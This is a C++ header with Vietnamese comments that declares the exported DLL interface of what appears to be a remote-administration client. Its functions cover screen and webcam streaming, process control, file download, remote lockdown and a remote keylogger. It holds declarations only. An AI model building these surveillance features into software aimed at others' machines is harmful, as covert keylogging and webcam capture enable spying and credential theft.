#ifndef CLIENTLIB_H
#define CLIENTLIB_H

#include <string>
#include <vector>
#include <map>
#include <winsock2.h>

// Định nghĩa macro để xuất hàm ra DLL
#ifdef BUILD_DLL
    #define DLLEXPORT extern "C" __declspec(dllexport)
#else
    #define DLLEXPORT extern "C" __declspec(dllimport)
#endif

// Cấu trúc hỗ trợ (Giữ nguyên dùng nội bộ nếu cần)
struct ProcessInfo {
    std::string name;
    std::string id;
    std::string threadCount;
};
typedef std::map<std::string, ProcessInfo> ProcessMap;

// ==========================================
//      CÁC HÀM XUẤT KHẨU (Mapping với Python)
// ==========================================

// 1. Quản lý kết nối
DLLEXPORT void InitWinsock();
DLLEXPORT bool ConnectToServer(const char* ip, int port);
DLLEXPORT void CloseConnection();

// 2. Gửi lệnh thô
DLLEXPORT void SendStringCmd(const char* cmd);

// 3. Các hàm lấy thông tin (ĐÃ SỬA KIỂU TRẢ VỀ -> const char*)
DLLEXPORT const char* GetAppList();         // Thay vì void
DLLEXPORT const char* GetProcessList();     // Thay vì void
DLLEXPORT const char* GetInstalledApps();   // Thay vì void
DLLEXPORT const char* GetDrives();          // Thay vì void
DLLEXPORT const char* ExplorePath(const char* path); // Thay vì void

// 4. Các hàm xử lý đa phương tiện (Vẫn giữ void vì ghi file binary)
DLLEXPORT void CaptureScreen();
DLLEXPORT void ReceiveVideoStream(int duration);
DLLEXPORT void ReceiveWebcamStream();
DLLEXPORT void ReceiveScreenStream();

// 5. Các hàm điều khiển hệ thống
DLLEXPORT void KillProcess(const char* pid);
DLLEXPORT void StartProcess(const char* name);
DLLEXPORT void ShutdownServer();
DLLEXPORT void RestartServer();

// 6. Keylogger & Notification
DLLEXPORT void HookKeylog();
DLLEXPORT void UnhookKeylog();
DLLEXPORT void GetKeylog();
DLLEXPORT void GetNotificationHistory();

// Thêm dòng này vào ClientLib.h
DLLEXPORT void DownloadFile(const char* remotePath, const char* localPath);

DLLEXPORT void ClearKeylogRemote();
DLLEXPORT const char* GetSystemStats();
DLLEXPORT void LockServer();

#endif // CLIENTLIB_H